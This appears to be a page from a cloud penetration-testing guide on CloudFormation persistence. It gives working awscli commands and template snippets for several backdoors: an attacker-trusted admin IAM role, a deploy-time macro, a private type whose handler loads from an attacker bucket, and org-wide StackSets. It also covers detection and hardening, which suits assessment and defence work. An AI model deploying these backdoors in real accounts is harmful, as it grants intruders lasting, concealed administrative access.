---
cstg_id: CSTG-AWS-CLOUDFORMATION-PERSIST
title: "AWS Cloudformation - Persistence"
provider: aws
service: cloudformation
phase: persistence
required_access: assumed-breach
required_permissions:
  - cloudformation:CreateStack
  - cloudformation:UpdateStack
  - cloudformation:CreateChangeSet
  - cloudformation:ExecuteChangeSet
  - cloudformation:RegisterType
  - cloudformation:CreateStackSet
  - cloudformation:CreateStackInstances
  - cloudformation:UpdateTerminationProtection
  - iam:PassRole
tools:
  - awscli
  - pacu
references:
  - "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-cfn-macros.html"
  - "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/registry.html"
  - "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-attribute-deletionpolicy.html"
  - "https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/"
  - "https://hackingthe.cloud/aws/post_exploitation/create_backdoor_user/"
license: CC BY-SA 4.0
---

## Summary

Because CloudFormation both describes and continuously governs infrastructure, it is an effective place to establish durable, low-noise persistence. A backdoor embedded in a stack template is reapplied automatically whenever the stack is updated, and — if drift remediation or self-managed reconciliation is in use — can even be restored after a defender removes the underlying resource. Persistence techniques here fall into three families:

1. **Resource-level backdoors inside templates** — an IAM role/user, access key, or trust relationship declared in a legitimate-looking stack so it is recreated on every deployment.
2. **Code-execution hooks tied to the deployment pipeline** — CloudFormation **macros** and registered **custom resource types** (extensions) that invoke attacker-controlled Lambda functions whenever templates are processed.
3. **Cross-account and self-healing constructs** — StackSets that re-push backdoors org-wide, and `DeletionPolicy: Retain` resources that survive stack deletion.

The attacker objective is to retain access that blends into normal IaC activity and is resilient to credential rotation and resource cleanup. This page assumes the access and permissions obtained in [Privilege Escalation](../03-privilege-escalation/aws-cloudformation-privesc.md); use [Enumeration](../02-services/aws-cloudformation-enum.md) to find the best stacks to subvert.

## Prerequisites

A foothold with credentials able to create or update stacks (or change sets), and — for the strongest techniques — to register macros/types or create StackSets. As with privilege escalation, IAM-creating templates require `CAPABILITY_NAMED_IAM`, and macro/transform expansion requires `CAPABILITY_AUTO_EXPAND`. Passing a privileged service role (`iam:PassRole`) lets the backdoor be installed even when the caller's own identity lacks IAM permissions.

## Enumeration

Locate the best persistence hosts and confirm capabilities:

```bash
# Active, frequently-updated stacks make ideal hosts (the backdoor reapplies on each update)
aws cloudformation describe-stacks \
  --query 'Stacks[].{Name:StackName,Role:RoleARN,Status:StackStatus,Updated:LastUpdatedTime}' --output table

# Existing macros/extensions registered in the account (and a place to hide new ones)
aws cloudformation list-types --visibility PRIVATE --type MODULE --output table
aws cloudformation list-types --visibility PRIVATE --type RESOURCE --output table

# StackSets that could re-push a backdoor across accounts
aws cloudformation list-stack-sets --output table

# Termination protection status (enable it to make removal harder)
aws cloudformation describe-stacks --stack-name <s> --query 'Stacks[0].EnableTerminationProtection'
```

## Misconfigurations & Findings

The conditions that make CloudFormation persistence viable (and that assessors should flag) include:

- **No template change review / no drift alerting.** Backdoor resources added to a template go unnoticed when there is no diff review or drift detection.
- **Permissive, shared service roles** that allow stacks to create IAM principals and Lambda functions.
- **Unrestricted macro/type registration** (`cloudformation:RegisterType`, `RegisterPublisher`) lets attackers insert code-execution hooks into the deployment path.
- **`DeletionPolicy: Retain` on sensitive resource types** allows attacker-created roles/keys to survive stack deletion.
- **StackSets with broad execution roles** enable self-healing, org-wide backdoors.
- **Termination protection used as a control without monitoring its toggling**, so attackers can lock in their backdoor stack.

## Exploitation

### Backdoor IAM principal embedded in a stack

Add an attacker-controlled role (trusting an external account) or user with long-lived keys to a real stack, so it is recreated whenever the stack is redeployed. Pull the live template, inject the resource, and update in place — this looks like an ordinary deployment in CloudTrail:

```yaml
# appended to an existing, legitimate template
  MetricsCollectorRole:
    Type: AWS::IAM::Role
    DeletionPolicy: Retain          # survive stack deletion
    Properties:
      RoleName: metrics-collector
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal: { AWS: 'arn:aws:iam::444455556666:root' }  # attacker account
            Action: 'sts:AssumeRole'
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess
```

```bash
aws cloudformation update-stack --stack-name prod-app \
  --template-body file://patched.json \
  --role-arn arn:aws:iam::111122223333:role/PowerfulCfnServiceRole \
  --capabilities CAPABILITY_NAMED_IAM
```

Because the resource is part of the stack's declared state, removing it manually causes drift; with self-managed reconciliation or a redeploy, CloudFormation **recreates** it.

### CloudFormation macro backdoor (code execution on every deploy)

A macro is a Lambda function that CloudFormation invokes to transform templates that reference it. Registering a macro and adding its `Transform` to commonly-used templates yields code execution inside the deployment pipeline whenever those stacks are processed:

```bash
# 1) Create an attacker-controlled Lambda that returns the template (and does side work).
# 2) Register it as a macro.
aws cloudformation register-type ... # or:
aws cloudformation create-stack --stack-name shared-utils \
  --template-body file://macro-definition.yaml \
  --capabilities CAPABILITY_AUTO_EXPAND CAPABILITY_NAMED_IAM
```

Adding `Transform: [ "AttackerMacro" ]` to a frequently-deployed template causes the attacker Lambda to run with each deploy — a persistence and re-infection mechanism that triggers on legitimate pipeline activity. (This is the technique detailed by Rhino Security Labs' CloudFormation injection research.)

### Registered custom resource type / extension

A private resource type (extension) registered via `RegisterType` runs attacker-controlled handler code whenever a resource of that type is created, updated, or deleted. Embedding such a resource in a maintained stack provides a durable execution hook tied to the IaC lifecycle:

```bash
aws cloudformation register-type --type RESOURCE \
  --type-name "Acme::Ops::Maintenance" \
  --schema-handler-package s3://attacker-bucket/handler.zip \
  --execution-role-arn arn:aws:iam::111122223333:role/cfn-exec-role
```

### Self-healing StackSet backdoor

Push the backdoor template as a StackSet so it is deployed (and re-deployed on drift) across many accounts/regions. With service-managed StackSets and auto-deployment enabled, new accounts joining the target OU receive the backdoor automatically:

```bash
aws cloudformation create-stack-set --stack-set-name org-telemetry \
  --template-body file://backdoor-role.yaml --capabilities CAPABILITY_NAMED_IAM \
  --permission-model SERVICE_MANAGED \
  --auto-deployment Enabled=true,RetainStacksOnAccountRemoval=true

aws cloudformation create-stack-instances --stack-set-name org-telemetry \
  --deployment-targets OrganizationalUnitIds=ou-abcd-12345678 --regions us-east-1
```

### Retain-on-delete and termination protection

Combine `DeletionPolicy: Retain` (so the backdoor resource outlives the stack) with termination protection (so the host stack is harder to delete):

```bash
aws cloudformation update-termination-protection \
  --stack-name prod-app --enable-termination-protection
```

A defender who deletes the stack may leave the retained role/key in place; a defender who cannot easily delete the stack may leave the whole backdoor running.

## Detection & Logging

All of the above are visible in **CloudTrail** under `cloudformation.amazonaws.com` and, for the resulting resources, under the relevant service (`iam.amazonaws.com`, `lambda.amazonaws.com`). Key signals:

- `UpdateStack`/`ExecuteChangeSet` with `CAPABILITY_NAMED_IAM` that introduces new IAM principals — correlate with subsequent `iam:CreateRole`/`iam:CreateAccessKey` attributed to the stack's service role.
- `RegisterType` / `RegisterPublisher` / `SetTypeDefaultVersion` events, which are rare in most accounts and warrant investigation. New `AWS::CloudFormation::Macro` resources or templates gaining a `Transform` directive are notable.
- `CreateStackSet` / `CreateStackInstances` with `AutoDeployment` enabled, or targeting OUs, indicating org-wide propagation.
- `UpdateTerminationProtection` toggled on by an unexpected principal.
- **Drift detection** (`DetectStackDrift`) is a defensive tool here: a backdoor resource manually removed by an attacker-aware defender, then reappearing, indicates self-healing persistence — and reviewing drift surfaces resources that no longer match an approved template.
- Trust policies referencing external/unknown account IDs in IAM roles created via CloudFormation are a strong indicator. Audit `Principal.AWS` values against the organization's known account list.

Because the backdoor's IAM mutations are attributed to a CloudFormation service role rather than the human attacker, detections should correlate the deploy event's human principal/source IP with the service-role-attributed resource creation.

## Remediation & Hardening

- **Mandatory template review and change control.** Require diffs and approvals on all template/stack changes; deploy only from version-controlled, reviewed sources via a controlled pipeline.
- **Continuous drift detection and alerting.** Schedule `DetectStackDrift` and alert on unexpected resources, especially IAM principals and Lambda functions.
- **Lock down macros and types.** Restrict `cloudformation:RegisterType`, `RegisterPublisher`, and macro creation to a small set of trusted principals; inventory and review all private types and macros.
- **Least-privilege service roles** scoped to only the resource types each stack legitimately manages — denying IAM and Lambda creation where unnecessary blocks most backdoor resources.
- **Restrict StackSets.** Limit who can create stack sets/instances and tightly scope execution roles; review `AutoDeployment` and `RetainStacksOnAccountRemoval` settings.
- **Audit retained resources.** Inventory `DeletionPolicy: Retain` resources and orphaned roles/keys after stack deletions.
- **Monitor `UpdateTerminationProtection`** changes and reconcile against approved operations.
- **Alert on IAM roles whose trust policies reference external account IDs**, regardless of how they were created.

## Tools

- **awscli** — installs and manages all stack, macro, type, and StackSet constructs described.
- **pacu** — includes modules for backdoor IAM creation and CloudFormation-based post-exploitation.

## References

- Using CloudFormation macros — https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-cfn-macros.html
- CloudFormation registry (custom types/extensions) — https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/registry.html
- DeletionPolicy attribute — https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-attribute-deletionpolicy.html
- Rhino Security Labs — Cloud Malware: CloudFormation injection — https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/
- hackingthe.cloud — Create a backdoor user — https://hackingthe.cloud/aws/post_exploitation/create_backdoor_user/
